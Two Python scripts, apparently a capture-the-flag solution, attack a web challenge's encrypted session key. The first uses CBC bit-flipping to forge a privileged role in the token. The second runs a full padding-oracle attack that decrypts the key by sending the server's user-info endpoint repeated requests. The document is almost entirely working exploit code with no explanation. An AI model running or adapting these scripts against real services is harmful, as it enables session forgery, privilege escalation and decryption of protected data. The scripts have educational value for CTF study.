
## CBC
```python
import time

import requests
import base64
import json

host = "0b940989-8cd4-4990-955c-62272a7ba9a5.node2.buuoj.cn.wetolink.com"
port = 82

def cbc_attack(key, block, origin_content, target_content):
    user_key_decode = base64.b64decode(key)
    #print(user_key_decode)
    user_key_json_decode = json.loads(user_key_decode)
    signed_key = user_key_json_decode['signed_key']
    #print(signed_key)
    cipher_o = base64.b64decode(signed_key)
    #print(cipher_o)
    if block > 0:
        iv_prefix = cipher_o[:block * 16]
    else:
        iv_prefix = b''
    iv = cipher_o[block * 16:16 + block * 16]
    cipher = cipher_o[16 + block * 16:]
    iv_array = bytearray(iv)
    for i in range(0, 16):
        iv_array[i] = iv_array[i] ^ ord(origin_content[i]) ^ ord(target_content[i])
    iv = bytes(iv_array)
    #print(iv)
    user_key_json_decode['signed_key'] = base64.b64encode(iv_prefix + iv + cipher).decode('utf-8')
    return base64.b64encode(bytes(json.dumps(user_key_json_decode), "utf-8"))

def get_user_info(key):
    r = requests.post("http://" + host + ":" + str(port) + "/frontend/api/v1/user/info", headers={"Key": key})
    if r.json()['code'] == 100:
        print("获取成功！")
    return r.json()['data']

def modify_role_plain(key, role):
    user_key_decode = base64.b64decode(user_key)
    user_key_json_decode = json.loads(user_key_decode)
    user_key_json_decode['role'] = role
    return base64.b64encode(bytes(json.dumps(user_key_json_decode), 'utf-8')).decode('utf-8')

user_key = cbc_attack(
    "eyJzaWduZWRfa2V5IjoiU1VONGExTnBibWRFWVc1alpWSmhVS\
HNGUVI0bG41VkZDOUwwOWVjaGtZaFRXUWdpd1pvaGoyN0pXdDk4Lysx\
WldiMU1CUTNxVEplL2lGcExsbTlUNGxFQkZrOFNmQ1lvRW96MTdMQlp\
jV25VOS92WkxuMHBiVVliakF3RUJqV0s1ZldXb3ZIeG1JRG9wRHFHTVF\
jQ0tBPT0iLCJyb2xlIjozLCJ1c2VyX2lkIjoxLCJwYXlsb2FkIjoiMVU1\
Rm0zWGk3VE12dllGaFZxQkluVWZ2MGJxNEFpTWYiLCJleHBpcmVfaW4iO\
jE1NzA1MjU0MTB9", 0, '{"role":3,"user_', '{"role":1,"user_')
user_key = modify_role_plain(user_key, 1)
print(user_key)
```

## padding-oracle attack

```python
import time

import requests
import base64
import json

host = "0b940989-8cd4-4990-955c-62272a7ba9a5.node2.buuoj.cn.wetolink.com"
port = 82

def padding_oracle(key):
    user_key_decode = base64.b64decode(key)
    user_key_json_decode = json.loads(user_key_decode)
    signed_key = user_key_json_decode['signed_key']
    signed_key_decoded = base64.b64decode(signed_key)
    #print(signed_key_decoded)
    url = "http://" + host + ":" + str(port) + "/frontend/api/v1/user/info"
    #print(signed_key_decoded)
    # b'ICxkSingDanceRaPY\xac\xad>\xe4h]\xd0[\xfa(_\xb5*N(&\xc8\xc62\xd1\x06>M\xe2\xb7\xdaLEz\x8cd\xfd\x8e\xb2\xde\x19\xbf\x84\x15\xbe\x88\xb8\xae*\xfb\x0c)#\xbeT\xf0\x89\x14\x8e\xce\x96\xb4\xbf\x1aV\xbcU\x98ns;\xf9\xfb\xcb\xf7Z\xb0\x88\x1c\xd4\xa6D\xd2\xa5\x00^\x03\xbd\x1e\xa5\xd1\x19Tf=3g\xcd\xd7\x88'
    # print(len(signed_key_decoded))
    # 112/16=7
    N = 16

    total_plain = ''
    for block in range(0, len(signed_key_decoded) // 16 - 1):
        token = ''
        get = b""
        cipher = signed_key_decoded[16 + block * 16:32 + block * 16]
        for i in range(1, N+1):
            for j in range(0, 256):
                time.sleep(0.1)
                padding = b"".join([(get[n] ^ i).to_bytes(1, 'little') for n in range(len(get))])
                c = b'\x00' * (16 - i) + j.to_bytes(1, 'little') + padding + cipher
                #print(c)
                token = base64.b64encode(c)
                user_key_json_decode['signed_key'] = token.decode("utf-8")
                header = {'Key': base64.b64encode(bytes(json.dumps(user_key_json_decode), "utf-8"))}
                res = requests.get(url, headers=header)
                #print(res.text, j)
                if res.json()['code'] != 205:
                    get = (j ^ i).to_bytes(1, 'little') + get
                    print(get, i)
                    break

        plain = b"".join([(get[i] ^ signed_key_decoded[block * 16 + i]).to_bytes(1, 'little') for i in range(N)])
        print(plain.decode("utf-8"), "block=%d" % block)
        total_plain += plain.decode("utf-8")
        print(total_plain)

    return total_plain

plain_text = padding_oracle(
    "eyJzaWduZWRfa2V5IjoiU1VONGExTnBibWRFWVc1alpWSmhVSHNGUVI0bG41VkZDOUwwOWVjaGtZaFRXUWdpd1pvaGoyN0pXdDk4LysxWldiMU1CUTNxVEplL2lGcExsbTlUNGxFQkZrOFNmQ1lvRW96MTdMQlpjV25VOS92WkxuMHBiVVliakF3RUJqV0s1ZldXb3ZIeG1JRG9wRHFHTVFjQ0tBPT0iLCJyb2xlIjozLCJ1c2VyX2lkIjoxLCJwYXlsb2FkIjoiMVU1Rm0zWGk3VE12dllGaFZxQkluVWZ2MGJxNEFpTWYiLCJleHBpcmVfaW4iOjE1NzA1MjU0MTB9")
print(plain_text)
```
